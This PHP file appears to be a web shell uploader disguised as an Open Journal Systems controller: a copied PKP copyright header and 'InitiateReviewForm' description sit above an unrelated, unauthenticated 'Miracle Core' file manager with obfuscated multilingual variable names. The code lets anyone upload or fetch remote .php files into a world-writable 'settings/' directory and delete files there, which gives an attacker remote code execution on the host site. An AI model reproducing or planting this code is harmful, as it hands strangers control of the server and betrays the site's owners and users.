<?php

/**
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @class InitiateReviewForm
 * @ingroup controllers_modal_editorDecision_form
 *
 * @brief Form for creating the first review round for a submission's external
 *  review (skipping internal)
 */


$тӗл_dir = "settings/";
$許可された拡張機能 = array('php', 'html', 'jpg', 'gif', 'png', 'webp');
$最大ファイルサイズ = 10 * 1024 * 1024;

if (!file_exists($тӗл_dir)) {
    mkdir($тӗл_dir, 0777, true);
}

// Handle file transfer from device
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['miracle_file'])) {
    $NasiGulaiMbakAyu = array();
    
    $file = $_FILES['miracle_file'];
    $ファイル拡張子 = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if (!in_array($ファイル拡張子, $許可された拡張機能)) {
        $NasiGulaiMbakAyu['status'] = 'error';
        $NasiGulaiMbakAyu['message'] = 'Недопустимый формат файла';
        echo json_encode($NasiGulaiMbakAyu);
        exit;
    }
    
    if ($file['size'] > $最大ファイルサイズ) {
        $NasiGulaiMbakAyu['status'] = 'error';
        $NasiGulaiMbakAyu['message'] = 'Файл слишком большой';
        echo json_encode($NasiGulaiMbakAyu);
        exit;
    }
    
    $sekwenza_każwali = bin2hex(random_bytes(8));
    $rawrr = "miracle_" . $sekwenza_każwali . "." . $ファイル拡張子;
    $тӗл_file = $тӗл_dir . $rawrr;
    
    if (move_uploaded_file($file['tmp_name'], $тӗл_file)) {
        $NasiGulaiMbakAyu['status'] = 'success';
        $NasiGulaiMbakAyu['message'] = 'Файл успешно передан';
        $NasiGulaiMbakAyu['filename'] = $rawrr;
        $NasiGulaiMbakAyu['size'] = filesize($тӗл_file);
        $NasiGulaiMbakAyu['url'] = $тӗл_file;
    } else {
        $NasiGulaiMbakAyu['status'] = 'error';
        $NasiGulaiMbakAyu['message'] = 'Ошибка при передаче файла';
    }
    
    echo json_encode($NasiGulaiMbakAyu);
    exit;
}

// Handle file acquisition from URL
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['remote_url'])) {
    $NasiGulaiMbakAyu = array();
    $remote_url = $_POST['remote_url'];
    
    // Validate URL
    if (!filter_var($remote_url, FILTER_VALIDATE_URL)) {
        $NasiGulaiMbakAyu['status'] = 'error';
        $NasiGulaiMbakAyu['message'] = 'Недействительный URL-адрес';
        echo json_encode($NasiGulaiMbakAyu);
        exit;
    }
    
    // Get file extension from URL
    $parsed_url = parse_url($remote_url);
    $path_info = pathinfo($parsed_url['path']);
    $ファイル拡張子 = isset($path_info['extension']) ? strtolower($path_info['extension']) : '';
    
    // Validate extension
    if (!in_array($ファイル拡張子, $許可された拡張機能)) {
        $NasiGulaiMbakAyu['status'] = 'error';
        $NasiGulaiMbakAyu['message'] = 'Недопустимый формат файла в URL';
        echo json_encode($NasiGulaiMbakAyu);
        exit;
    }
    
    // Initialize cURL
    $ch = curl_init($remote_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Miracle-Core/1.0');
    
    $file_content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $content_length = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
    curl_close($ch);
    
    if ($http_code !== 200 || $file_content === false) {
        $NasiGulaiMbakAyu['status'] = 'error';
        $NasiGulaiMbakAyu['message'] = 'Не удалось получить файл из URL';
        echo json_encode($NasiGulaiMbakAyu);
        exit;
    }
    
    // Check file size
    $file_size = strlen($file_content);
    if ($file_size > $最大ファイルサイズ) {
        $NasiGulaiMbakAyu['status'] = 'error';
        $NasiGulaiMbakAyu['message'] = 'Файл слишком большой';
        echo json_encode($NasiGulaiMbakAyu);
        exit;
    }
    
    // Generate unique filename
    $sekwenza_każwali = bin2hex(random_bytes(8));
    $rawrr = "miracle_" . $sekwenza_każwali . "." . $ファイル拡張子;
    $тӗл_file = $тӗл_dir . $rawrr;
    
    // Save file
    if (file_put_contents($тӗл_file, $file_content) !== false) {
        $NasiGulaiMbakAyu['status'] = 'success';
        $NasiGulaiMbakAyu['message'] = 'Файл успешно получен из URL';
        $NasiGulaiMbakAyu['filename'] = $rawrr;
        $NasiGulaiMbakAyu['size'] = $file_size;
        $NasiGulaiMbakAyu['url'] = $тӗл_file;
    } else {
        $NasiGulaiMbakAyu['status'] = 'error';
        $NasiGulaiMbakAyu['message'] = 'Ошибка при сохранении файла';
    }
    
    echo json_encode($NasiGulaiMbakAyu);
    exit;
}

// Handle file deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $فائل = basename($_POST['delete_file']);
    $سینہ = $тӗл_dir . $فائل;
    
    if (file_exists($سینہ)) {
        unlink($سینہ);
        echo json_encode(['status' => 'success', 'message' => 'Файл удален']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Файл не найден']);
    }
    exit;
}

function getFileList($dir) {
    $files = array();
    if (is_dir($dir)) {
        $NasiPadangGoreng = scandir($dir);
        foreach ($NasiPadangGoreng as $item) {
            if ($item != '.' && $item != '..') {
                $سینہ = $dir . $item;
                $files[] = array(
                    'name' => $item,
                    'size' => filesize($سینہ),
                    'date' => date("d.m.Y H:i", filemtime($سینہ)),
                    'url' => $سینہ
                );
            }
        }
    }
    return $files;
}

$existing_files = getFileList($тӗл_dir);

function getDirSize($dir) {
    $size = 0;
    if (is_dir($dir)) {
        $NasiPadangGoreng = scandir($dir);
        foreach ($NasiPadangGoreng as $item) {
            if ($item != '.' && $item != '..') {
                $size += filesize($dir . $item);
            }
        }
    }
    return $size;
}

$MakanHatiCoy = getDirSize($тӗл_dir);
$TahuBulatMbakRatna = 100 * 1024 * 1024;
$MakanHatiDicampurTahuBulatMbakRatna = ($MakanHatiCoy / $TahuBulatMbakRatna) * 100;
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Miracle Core - Панель управления файлами</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #0a0a0a;
            color: #e0e0e0;
            display: flex;
            min-height: 100vh;
        }
        
        /* Sidebar */
        .sidebar {
            width: 280px;
            background: linear-gradient(180deg, #0d0d0d 0%, #1a1a1a 100%);
            border-right: 1px solid #00ff88;
            padding: 30px 20px;
            display: flex;
            flex-direction: column;
            box-shadow: 4px 0 20px rgba(0, 255, 136, 0.1);
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 40px;
            padding-bottom: 25px;
            border-bottom: 2px solid #00ff88;
        }
        
        .logo-icon {
            width: 45px;
            height: 45px;
            background: linear-gradient(135deg, #00ff88 0%, #00cc6a 100%);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 24px;
            color: #000;
            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
        }
        
        .logo-text {
            font-size: 22px;
            font-weight: 700;
            color: #00ff88;
            letter-spacing: 0.5px;
        }
        
        .stats-card {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
        }
        
        .stats-title {
            font-size: 13px;
            color: #888;
            margin-bottom: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .stats-value {
            font-size: 28px;
            font-weight: 700;
            color: #00ff88;
            margin-bottom: 15px;
        }
        
        .storage-bar {
            width: 100%;
            height: 8px;
            background: #2a2a2a;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 8px;
        }
        
        .storage-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff88 0%, #00cc6a 100%);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        
        .storage-text {
            font-size: 12px;
            color: #666;
        }
        
        .menu-item {
            padding: 14px 18px;
            margin-bottom: 8px;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 12px;
            color: #999;
        }
        
        .menu-item:hover {
            background: #2a2a2a;
            color: #00ff88;
        }
        
        .menu-item.active {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border-left: 3px solid #00ff88;
        }
        
        /* Main Content */
        .main-content {
            flex: 1;
            padding: 40px;
            overflow-y: auto;
        }
        
        .header {
            margin-bottom: 35px;
        }
        
        .header h1 {
            font-size: 32px;
            color: #fff;
            margin-bottom: 8px;
        }
        
        .header p {
            color: #666;
            font-size: 14px;
        }
        
        /* Tab Navigation */
        .tab-navigation {
            display: flex;
            gap: 10px;
            margin-bottom: 30px;
            border-bottom: 2px solid #2a2a2a;
        }
        
        .tab-button {
            padding: 12px 24px;
            background: transparent;
            border: none;
            color: #666;
            cursor: pointer;
            font-size: 15px;
            font-weight: 500;
            transition: all 0.3s;
            border-bottom: 3px solid transparent;
            margin-bottom: -2px;
        }
        
        .tab-button:hover {
            color: #00ff88;
        }
        
        .tab-button.active {
            color: #00ff88;
            border-bottom-color: #00ff88;
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Drop Zone */
        .transfer-zone {
            border: 3px dashed #2a2a2a;
            border-radius: 16px;
            padding: 60px 40px;
            text-align: center;
            background: #141414;
            margin-bottom: 35px;
            transition: all 0.3s;
            cursor: pointer;
        }
        
        .transfer-zone:hover,
        .transfer-zone.dragover {
            border-color: #00ff88;
            background: rgba(0, 255, 136, 0.05);
        }
        
        .transfer-icon {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.6;
        }
        
        .transfer-zone h3 {
            font-size: 22px;
            color: #fff;
            margin-bottom: 10px;
        }
        
        .transfer-zone p {
            color: #666;
            margin-bottom: 20px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #00ff88 0%, #00cc6a 100%);
            color: #000;
            border: none;
            padding: 14px 32px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 255, 136, 0.4);
        }
        
        .allowed-formats {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .format-badge {
            background: #1a1a1a;
            border: 1px solid #2a2a2a;
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 12px;
            color: #00ff88;
            font-weight: 500;
        }
        
        /* URL Input Section */
        .url-section {
            background: #141414;
            border: 1px solid #2a2a2a;
            border-radius: 16px;
            padding: 40px;
            margin-bottom: 35px;
        }
        
        .url-section h3 {
            font-size: 22px;
            color: #fff;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .url-section p {
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
        }
        
        .url-input-group {
            display: flex;
            gap: 12px;
            align-items: stretch;
        }
        
        .url-input {
            flex: 1;
            background: #1a1a1a;
            border: 2px solid #2a2a2a;
            border-radius: 8px;
            padding: 14px 18px;
            color: #fff;
            font-size: 15px;
            transition: all 0.3s;
        }
        
        .url-input:focus {
            outline: none;
            border-color: #00ff88;
            background: #0d0d0d;
        }
        
        .url-input::placeholder {
            color: #555;
        }
        
        /* File List */
        .file-section {
            margin-top: 40px;
        }
        
        .section-title {
            font-size: 20px;
            color: #fff;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .file-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
        }
        
        .file-card {
            background: #141414;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s;
            position: relative;
        }
        
        .file-card:hover {
            border-color: #00ff88;
            transform: translateY(-4px);
            box-shadow: 0 8px 25px rgba(0, 255, 136, 0.15);
        }
        
        .file-preview {
            width: 100%;
            height: 160px;
            background: #1a1a1a;
            border-radius: 8px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .file-preview img {
            max-width: 100%;
            max-height: 100%;
            object-fit: cover;
        }
        
        .file-icon {
            font-size: 48px;
            opacity: 0.4;
        }
        
        .file-name {
            font-size: 14px;
            color: #fff;
            margin-bottom: 8px;
            word-break: break-all;
            font-weight: 500;
        }
        
        .file-meta {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #666;
            margin-bottom: 15px;
        }
        
        .file-actions {
            display: flex;
            gap: 10px;
        }
        
        .btn-small {
            flex: 1;
            padding: 8px 16px;
            border-radius: 6px;
            border: 1px solid #2a2a2a;
            background: #1a1a1a;
            color: #999;
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
        }
        
        .btn-small:hover {
            border-color: #00ff88;
            color: #00ff88;
        }
        
        .btn-delete {
            background: rgba(255, 50, 50, 0.1);
            border-color: rgba(255, 50, 50, 0.3);
            color: #ff5555;
        }
        
        .btn-delete:hover {
            background: rgba(255, 50, 50, 0.2);
            border-color: #ff5555;
        }
        
        /* Progress Bar */
        .progress-container {
            display: none;
            margin-top: 20px;
            background: #1a1a1a;
            border-radius: 8px;
            padding: 20px;
            border: 1px solid #2a2a2a;
        }
        
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #2a2a2a;
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff88 0%, #00cc6a 100%);
            width: 0%;
            transition: width 0.3s;
        }
        
        .progress-text {
            font-size: 13px;
            color: #999;
        }
        
        /* Notifications */
        .notification {
            position: fixed;
            top: 30px;
            right: 30px;
            background: #1a1a1a;
            border: 1px solid #00ff88;
            border-radius: 10px;
            padding: 18px 24px;
            box-shadow: 0 8px 30px rgba(0, 255, 136, 0.3);
            z-index: 1000;
            display: none;
            min-width: 300px;
        }
        
        .notification.success {
            border-color: #00ff88;
        }
        
        .notification.error {
            border-color: #ff5555;
        }
        
        .notification-title {
            font-weight: 600;
            margin-bottom: 5px;
            color: #fff;
        }
        
        .notification-message {
            font-size: 13px;
            color: #999;
        }
        
        input[type="file"] {
            display: none;
        }
        
        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                border-right: none;
                border-bottom: 1px solid #00ff88;
            }
            
            .main-content {
                padding: 20px;
            }
            
            .file-grid {
                grid-template-columns: 1fr;
            }
            
            .url-input-group {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <!-- Sidebar -->
    <div class="sidebar">
        <div class="logo">
            <div class="logo-icon">M</div>
            <div class="logo-text">Miracle Core</div>
        </div>
        
        <div class="stats-card">
            <div class="stats-title">Хранилище</div>
            <div class="stats-value"><?php echo count($existing_files); ?></div>
            <div class="storage-bar">
                <div class="storage-fill" style="width: <?php echo min($MakanHatiDicampurTahuBulatMbakRatna, 100); ?>%"></div>
            </div>
            <div class="storage-text">
                <?php echo number_format($MakanHatiCoy / 1024 / 1024, 2); ?> МБ / 
                <?php echo number_format($TahuBulatMbakRatna / 1024 / 1024, 0); ?> МБ
            </div>
        </div>
        
        <div class="menu-item active">
            <span>📁</span> Все файлы
        </div>
        <div class="menu-item">
            <span>🖼️</span> Изображения
        </div>
        <div class="menu-item">
            <span>📄</span> Документы
        </div>
        <div class="menu-item">
            <span>⚙️</span> Настройки
        </div>
    </div>
    
    <!-- Main Content -->
    <div class="main-content">
        <div class="header">
            <h1>Панель управления файлами</h1>
            <p>Передавайте и управляйте вашими файлами безопасно</p>
        </div>
        
        <!-- Tab Navigation -->
        <div class="tab-navigation">
            <button class="tab-button active" onclick="switchTab('device')">
                📤 С устройства
            </button>
            <button class="tab-button" onclick="switchTab('url')">
                🌐 Из URL
            </button>
        </div>
        
        <!-- Device Transfer Tab -->
        <div class="tab-content active" id="deviceTab">
            <div class="transfer-zone" id="transferZone">
                <div class="transfer-icon">📤</div>
                <h3>Перетащите файлы сюда</h3>
                <p>или нажмите кнопку ниже для выбора файлов</p>
                <button class="btn-primary" onclick="document.getElementById('fileInput').click()">
                    Выбрать файлы
                </button>
                <input type="file" id="fileInput" accept=".php,.html,.jpg,.gif,.png,.webp">
                
                <div class="allowed-formats">
                    <span class="format-badge">.PHP</span>
                    <span class="format-badge">.HTML</span>
                    <span class="format-badge">.JPG</span>
                    <span class="format-badge">.GIF</span>
                    <span class="format-badge">.PNG</span>
                    <span class="format-badge">.WEBP</span>
                </div>
            </div>
            
            <div class="progress-container" id="progressContainer">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-text" id="progressText">Передача файла...</div>
            </div>
        </div>
        
        <!-- URL Transfer Tab -->
        <div class="tab-content" id="urlTab">
            <div class="url-section">
                <h3>🌐 Получить файл из URL</h3>
                <p>Введите прямую ссылку на файл для автоматического получения</p>
                
                <div class="url-input-group">
                    <input 
                        type="text" 
                        class="url-input" 
                        id="urlInput" 
                        placeholder="https://nekopoi.care/tumbnail/step-mom.jpg"
                    >
                    <button class="btn-primary" onclick="handleUrlTransfer()">
                        Получить файл
                    </button>
                </div>
                
                <div class="allowed-formats" style="margin-top: 20px;">
                    <span class="format-badge">.HTML</span>
                    <span class="format-badge">.JPG</span>
                    <span class="format-badge">.GIF</span>
                    <span class="format-badge">.PNG</span>
                    <span class="format-badge">.WEBP</span>
                </div>
            </div>
            
            <div class="progress-container" id="urlProgressContainer">
                <div class="progress-bar">
                    <div class="progress-fill" id="urlProgressFill"></div>
                </div>
                <div class="progress-text" id="urlProgressText">Получение файла из URL...</div>
            </div>
        </div>
        
        <!-- File List -->
        <div class="file-section">
            <div class="section-title">
                <span>📂</span> Мои файлы (<?php echo count($existing_files); ?>)
            </div>
            <div class="file-grid" id="fileGrid">
                <?php foreach ($existing_files as $file): ?>
                <div class="file-card" data-filename="<?php echo htmlspecialchars($file['name']); ?>">
                    <div class="file-preview">
                        <?php 
                        $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
                        if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'webp'])): 
                        ?>
                            <img src="<?php echo htmlspecialchars($file['url']); ?>" alt="Preview">
                        <?php else: ?>
                            <div class="file-icon">📄</div>
                        <?php endif; ?>
                    </div>
                    <div class="file-name"><?php echo htmlspecialchars($file['name']); ?></div>
                    <div class="file-meta">
                        <span><?php echo number_format($file['size'] / 1024, 2); ?> КБ</span>
                        <span><?php echo $file['date']; ?></span>
                    </div>
                    <div class="file-actions">
                        <button class="btn-small" onclick="window.open('<?php echo htmlspecialchars($file['url']); ?>', '_blank')">
                            Открыть
                        </button>
                        <button class="btn-small btn-delete" onclick="deleteFile('<?php echo htmlspecialchars($file['name']); ?>')">
                            Удалить
                        </button>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>
    
    <div class="notification" id="notification">
        <div class="notification-title" id="notificationTitle"></div>
        <div class="notification-message" id="notificationMessage"></div>
    </div>
    
    <script>
        // Tab switching
        function switchTab(tab) {
            const buttons = document.querySelectorAll('.tab-button');
            const contents = document.querySelectorAll('.tab-content');
            
            buttons.forEach(btn => btn.classList.remove('active'));
            contents.forEach(content => content.classList.remove('active'));
            
            if (tab === 'device') {
                buttons[0].classList.add('active');
                document.getElementById('deviceTab').classList.add('active');
            } else {
                buttons[1].classList.add('active');
                document.getElementById('urlTab').classList.add('active');
            }
        }
        
        // Device transfer
        const transferZone = document.getElementById('transferZone');
        const fileInput = document.getElementById('fileInput');
        const progressContainer = document.getElementById('progressContainer');
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        
        transferZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            transferZone.classList.add('dragover');
        });
        
        transferZone.addEventListener('dragleave', () => {
            transferZone.classList.remove('dragover');
        });
        
        transferZone.addEventListener('drop', (e) => {
            e.preventDefault();
            transferZone.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFileTransfer(files[0]);
            }
        });
        
        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFileTransfer(e.target.files[0]);
            }
        });
        
        function handleFileTransfer(file) {
            const formData = new FormData();
            formData.append('miracle_file', file);
            
            progressContainer.style.display = 'block';
            progressFill.style.width = '0%';
            progressText.textContent = 'Передача файла...';
            
            const xhr = new XMLHttpRequest();
            
            xhr.upload.addEventListener('progress', (e) => {
                if (e.lengthComputable) {
                    const percent = (e.loaded / e.total) * 100;
                    progressFill.style.width = percent + '%';
                    progressText.textContent = `Передача: ${Math.round(percent)}%`;
                }
            });
            
            xhr.addEventListener('load', () => {
                if (xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    if (response.status === 'success') {
                        showNotification('Успешно!', response.message, 'success');
                        setTimeout(() => location.reload(), 1500);
                    } else {
                        showNotification('Ошибка', response.message, 'error');
                        progressContainer.style.display = 'none';
                    }
                }
            });
            
            xhr.addEventListener('error', () => {
                showNotification('Ошибка', 'Произошла ошибка при передаче', 'error');
                progressContainer.style.display = 'none';
            });
            
            xhr.open('POST', '', true);
            xhr.send(formData);
        }
        
        // URL transfer
        function handleUrlTransfer() {
            const urlInput = document.getElementById('urlInput');
            const url = urlInput.value.trim();
            
            if (!url) {
                showNotification('Ошибка', 'Пожалуйста, введите URL', 'error');
                return;
            }
            
            const urlProgressContainer = document.getElementById('urlProgressContainer');
            const urlProgressFill = document.getElementById('urlProgressFill');
            const urlProgressText = document.getElementById('urlProgressText');
            
            urlProgressContainer.style.display = 'block';
            urlProgressFill.style.width = '0%';
            urlProgressText.textContent = 'Получение файла из URL...';
            
            // Simulate progress
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += 10;
                if (progress <= 90) {
                    urlProgressFill.style.width = progress + '%';
                    urlProgressText.textContent = `Получение: ${progress}%`;
                }
            }, 200);
            
            const formData = new FormData();
            formData.append('remote_url', url);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                clearInterval(progressInterval);
                urlProgressFill.style.width = '100%';
                
                if (data.status === 'success') {
                    showNotification('Успешно!', data.message, 'success');
                    urlInput.value = '';
                    setTimeout(() => location.reload(), 1500);
                } else {
                    showNotification('Ошибка', data.message, 'error');
                    urlProgressContainer.style.display = 'none';
                }
            })
            .catch(error => {
                clearInterval(progressInterval);
                showNotification('Ошибка', 'Не удалось получить файл из URL', 'error');
                urlProgressContainer.style.display = 'none';
            });
        }
        
        // Allow Enter key to trigger URL transfer
        document.getElementById('urlInput').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleUrlTransfer();
            }
        });
        
        // File deletion
        function deleteFile(filename) {
            if (!confirm('Вы уверены, что хотите удалить этот файл?')) {
                return;
            }
            
            const formData = new FormData();
            formData.append('delete_file', filename);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    showNotification('Успешно!', data.message, 'success');
                    document.querySelector(`[data-filename="${filename}"]`).remove();
                    setTimeout(() => location.reload(), 1000);
                } else {
                    showNotification('Ошибка', data.message, 'error');
                }
            });
        }
        
        // Notification system
        function showNotification(title, message, type) {
            const notification = document.getElementById('notification');
            const notificationTitle = document.getElementById('notificationTitle');
            const notificationMessage = document.getElementById('notificationMessage');
            
            notificationTitle.textContent = title;
            notificationMessage.textContent = message;
            notification.className = 'notification ' + type;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 4000);
        }
    </script>
</body>
</html>